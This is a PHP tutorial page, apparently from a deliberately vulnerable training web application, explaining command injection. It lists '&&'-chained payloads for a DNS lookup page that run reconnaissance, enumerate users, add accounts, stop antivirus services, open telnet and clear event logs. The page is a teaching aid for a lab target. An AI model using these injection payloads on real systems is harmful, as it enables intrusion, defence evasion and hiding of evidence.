<?php
	/*
	 * @author: Jeremy Druin
	 */
?>

<div>&nbsp;</div>
<table class="tutorial">
	<tr class="tutorial-title">
		<td colspan="10">Command Injection Tutorial</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
			Command injection may occur when a web application passes user input in part or in whole to
			the operating system for execution. 
			<br/><br/>
			It is also possible to execute system commands via SQL injection. For example, SQL Server 
			features the xp_cmdshell stored procedure which can execute operating system commands
			in the context of the web server if available. 
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
			Examples for page "dns-lookup.php"
		</td>
	</tr>
	<tr>
		<td style="white-space: pre;">
			Recon: Discover available functionality using provided help
			
				Windows XP: &amp;&amp; help
				Linux: &amp;&amp; &lt;cmd&gt; --help
				Linux: &amp;&amp; man &lt;cmd&gt;
			
			Recon: Determine current directory
			
				Windows XP: &amp;&amp; dir
				Linux: &amp;&amp; pwd
			
			Recon: Chain commands to discover driectory structure
			
				Windows XP: &amp;&amp; cd ../../.. &amp;&amp; dir
				Linux: &amp;&amp; cd ../../.. &amp;&amp; ls -l
			
			Scanning: Get machine network settings, hostname, DNS servers, subnet mask, etc.
			
				Windows XP: &amp;&amp; ipconfig /all
				Linux: &amp;&amp; ifconfig
			
			Scanning: Discover hosts on network
			
				Windows XP: &amp;&amp; ping -n 1 192.168.56.102
				Linux: &amp;&amp; ping -c 1 192.168.56.102
			
			Scanning: Enumerate Current user
			
				Windows XP: &amp;&amp; set
				Linux: &amp;&amp; whoami
			
			Scanning: Enumerate computers, users, groups, AD computers, AD users, AD groups
			
				Windows XP: &amp;&amp; net view [/domain]
				Windows XP: &amp;&amp; net user [/domain]
				Windows XP: &amp;&amp; net localgroup [/domain]
			
			Gaining Access: Add user
			
				Windows XP: &amp;&amp; net user &lt;username&gt; /add
				Linux: useradd &lt;username&gt; 
			
			Gaining Access: Delete user
			
				Windows XP: &amp;&amp; net user &lt;username&gt; /delete 
			
			Maintain Access: kill AV
			
				net stop &lt;av process&gt;
			
			Maintain Access: Kill AV/protective services or open backdoor services
				Windows XP: &amp;&amp; net stop &lt;service name&gt;
				Windows XP: &amp;&amp; net start telnet
				Windows XP: &amp;&amp; net stop telnet
				
			Cover Tracks: Clear logs
			
				Windows XP: &amp;&amp; wevtutil cl
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
</table>